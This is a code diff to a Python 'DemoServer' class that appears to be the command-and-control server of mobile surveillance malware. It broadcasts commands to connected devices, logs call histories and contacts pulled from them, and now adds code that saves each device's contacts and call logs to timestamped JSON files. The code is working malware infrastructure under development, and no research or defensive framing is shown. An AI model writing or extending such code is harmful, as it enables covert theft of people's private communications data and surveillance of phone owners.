@@ -404,8 +404,12 @@ class DemoServer:
             print("  " + "-" * 90)
 
     def send_command_to_all(self, command, args_json=""):
-        """Send command to all connected devices"""
+        """Send command to all connected devices (clean up dead sessions first)"""
         with self.lock:
+            # Clean up dead sessions
+            dead = [sid for sid, s in self.sessions.items() if not s.connected]
+            for sid in dead:
+                del self.sessions[sid]
             if not self.sessions:
                 print("  No devices connected.")
                 return
@@ -647,6 +651,11 @@ class DemoServer:
                 self.log(f"    [{type_str}] {call.get('name', 'Unknown')} - {call.get('number', '?')} ({call.get('duration_sec', 0)}s)")
             if count > 20:
                 self.log(f"    ... and {count - 20} more")
+            # Save to file
+            calllog_file = os.path.join(DOCS_DIR, f"call_logs_{session.session_id}_{int(time.time())}.json")
+            with open(calllog_file, 'w') as f:
+                json.dump(calls, f, indent=2)
+            self.log(f"    [+] Saved to: {calllog_file}")
             self.log_to_file(message, session.address)
 
         elif msg_type == "contacts":
@@ -656,10 +665,15 @@ class DemoServer:
             for contact in contacts[:20]:
                 name = contact.get("name", "Unknown")
                 phones = contact.get("phones", [])
-                phone_str = ", ".join(p.get("number", "") for p in phones)
+                phone_str = ", ".join(str(p) if isinstance(p, str) else p.get("number", "") for p in phones)
                 self.log(f"    - {name}: {phone_str}")
             if count > 20:
                 self.log(f"    ... and {count - 20} more")
+            # Save to file
+            contacts_file = os.path.join(DOCS_DIR, f"contacts_{session.session_id}_{int(time.time())}.json")
+            with open(contacts_file, 'w') as f:
+                json.dump(contacts, f, indent=2)
+            self.log(f"    [+] Saved to: {contacts_file}")
             self.log_to_file(message, session.address)
 
         elif msg_type == "file_list":
